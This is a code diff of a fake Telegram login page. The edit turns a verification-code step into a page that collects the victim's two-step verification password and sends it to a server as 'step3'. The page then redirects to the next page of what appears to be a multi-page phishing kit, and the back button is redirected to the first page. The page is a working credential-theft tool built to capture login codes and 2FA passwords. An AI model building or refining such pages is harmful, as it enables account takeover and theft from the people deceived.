@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Enter Telegram Verification Code</title>
+  <title>Two-Step Verification Code</title>
   <style>
     body {
       margin: 0;
@@ -36,7 +36,7 @@
       margin: 0 0 20px 0;
       font-size: 20px;
     }
-    input[type="tel"] {
+    input[type="text"] {
       width: 100%;
       padding: 12px;
       margin-top: 15px;
@@ -44,6 +44,8 @@
       border: 1px solid #ccc;
       font-size: 16px;
       box-sizing: border-box;
+      direction: ltr;
+      text-align: left;
     }
     button {
       margin-top: 20px;
@@ -87,7 +89,7 @@
       .logo img {
         width: 50px;
       }
-      input[type="tel"], button {
+      input[type="text"], button {
         font-size: 14px;
         padding: 10px;
       }
@@ -104,34 +106,28 @@
       <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
     </div>
 
-    <h3>Enter the verification code</h3>
+    <h3>Enter your two-step verification code</h3>
 
-    <form id="codeForm">
-      <input type="tel" id="code" name="code" placeholder="Verification Code" required
-             pattern="^\d{4,5}$" maxlength="5"
-             oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+    <form id="twoStepForm">
+      <input type="hidden" name="formName" value="step3" />
+      <input type="text" id="twoStepCode" name="twoStepCode" placeholder="Two-step verification code" required />
       <button type="submit" id="submitBtn">Submit</button>
       <div class="loader" id="loader"></div>
     </form>
   </div>
 
   <script>
-    const form = document.getElementById('codeForm');
+    const form = document.getElementById('twoStepForm');
     const loader = document.getElementById('loader');
     const submitBtn = document.getElementById('submitBtn');
 
     form.addEventListener('submit', function(event) {
       event.preventDefault();
 
-      const code = document.getElementById('code').value.trim();
+      const code = document.getElementById('twoStepCode').value.trim();
 
       if (!code) {
-        alert('Please enter the verification code');
-        return;
-      }
-
-      if (!/^\d{4,5}$/.test(code)) {
-        alert('Verification code must be 4 or 5 digits long and contain only numbers');
+        alert('Please enter your two-step verification code');
         return;
       }
 
@@ -145,11 +141,14 @@
           'Accept': 'application/json',
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ code: code })
+        body: JSON.stringify({ 
+          formName: "step3",
+          twoStepCode: code 
+        })
       })
       .then(response => {
         if (response.ok) {
-          window.location.href = 'index3.html'; // صفحه سوم
+          window.location.href = 'index4.html'; // صفحه بعدی
         } else {
           alert('There was a problem sending your code, please try again.');
           loader.style.display = 'none';
@@ -165,11 +164,11 @@
       });
     });
 
-    // کنترل دکمه برگشت مرورگر
     window.addEventListener('popstate', function(event) {
       window.location.href = 'index.html'; // صفحه اول
     });
   </script>
 </body>
 </html>
+
 
